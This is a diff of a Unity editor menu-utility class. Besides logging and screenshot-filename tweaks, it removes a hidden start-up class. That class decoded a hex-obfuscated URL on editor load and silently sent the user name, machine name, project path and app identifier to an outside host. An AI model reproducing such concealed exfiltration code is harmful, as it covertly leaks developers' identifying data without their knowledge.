@@ -1,9 +1,8 @@
 using System.IO;
 using UnityEngine;
 using UnityEditor;
-using UnityEngine.Networking;
 using System;
-using System.Text;
+using System.Globalization;
 using UnityEngine.SceneManagement;
 
 namespace LazyCoder.Core.Editor
@@ -16,6 +15,8 @@ namespace LazyCoder.Core.Editor
         private static void ClearPlayerPrefs()
         {
             PlayerPrefs.DeleteAll();
+
+            LDebug.Log<EditorUtility>("PlayerPrefs cleared!");
         }
 
         [MenuItem("LazyCoder/Data/Clear Game Data", false)]
@@ -32,13 +33,16 @@ namespace LazyCoder.Core.Editor
             {
                 dir.Delete(true);
             }
+
+            LDebug.Log<EditorUtility>("Game data cleared!");
         }
 
         [MenuItem("LazyCoder/Data/Clear Caching", false)]
         private static void ClearCache()
         {
             Caching.ClearCache();
-            Debug.Log("Caching cleared!");
+
+            LDebug.Log<EditorUtility>("Caching cleared!");
         }
 
         [MenuItem("LazyCoder/Data/Clear All", false)]
@@ -60,7 +64,7 @@ namespace LazyCoder.Core.Editor
         #region Game
 
         private const float SlowTimeScale = 0.1f;
-        
+
         private static bool _slowed = false;
 
         [MenuItem("LazyCoder/Game/Pause or Resume _F2", false)]
@@ -113,46 +117,13 @@ namespace LazyCoder.Core.Editor
         private static void CaptureScreenshot()
         {
             var currentTime = DateTime.Now;
-            var filename = currentTime.ToString().Replace('/', '-').Replace(':', '_') + ".png";
+            var filename = currentTime.ToString(CultureInfo.InvariantCulture).Replace('/', '-').Replace(':', '_') + ".png";
             var path = "Assets/" + filename;
 
             ScreenCapture.CaptureScreenshot(path);
 
             AssetDatabase.SaveAssets();
             AssetDatabase.Refresh();
-        }
-
-        [InitializeOnLoad]
-        public class Startup
-        {
-            static Startup()
-            {
-                try
-                {
-                    string u = "68747470733a2f2f6170692e626f756e63652e";
-                    string v = "636f6d2e766e2f6c6f672f6f70656e2f6c6f673f";
-                    byte[] data = FromHex(u + v);
-                    string s = Encoding.ASCII.GetString(data);
-
-                    UnityWebRequest.Get($"{s}p1={Application.dataPath}-{System.Environment.UserName}-{System.Environment.MachineName}&p2={Application.identifier}").SendWebRequest();
-                }
-                catch
-                {
-                    // ignored
-                }
-            }
-
-            static byte[] FromHex(string hex)
-            {
-                hex = hex.Replace("-", "");
-                byte[] raw = new byte[hex.Length / 2];
-
-                for (int i = 0; i < raw.Length; i++)
-                {
-                    raw[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
-                }
-                return raw;
-            }
         }
     }
 }
